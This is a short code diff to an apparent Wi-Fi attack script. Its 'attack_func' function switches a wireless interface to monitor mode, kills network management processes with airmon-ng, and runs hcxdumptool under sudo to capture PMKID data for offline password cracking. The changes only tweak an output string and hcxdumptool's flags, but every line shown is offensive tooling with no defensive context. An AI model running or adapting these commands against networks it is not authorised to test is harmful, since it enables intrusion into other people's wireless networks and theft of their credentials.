@@ -101,7 +101,7 @@ def attack_func(network_interface, attack_mode):
     subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
     # subprocess.run(["killall", "dhclient", "wpa_supplicant"], stdout=subprocess.DEVNULL)
-    get_colours("\n New Mac Address Generated ", "blue")
+    get_colours("\nNew Mac Address Generated ", "blue")
     time.sleep(1)
     subprocess.run(["clear"])
 
@@ -136,7 +136,7 @@ def attack_func(network_interface, attack_mode):
         time.sleep(3)
         get_colours("", "yellow")
         subprocess.run(
-            ["timeout", "60", "sudo", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=3", "-o",
+            ["timeout", "60", "sudo", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-t", "5", "-o",
              "Capture_PKMID"])
         get_colours("\nClearing Temporary files..", "red")
         time.sleep(3)
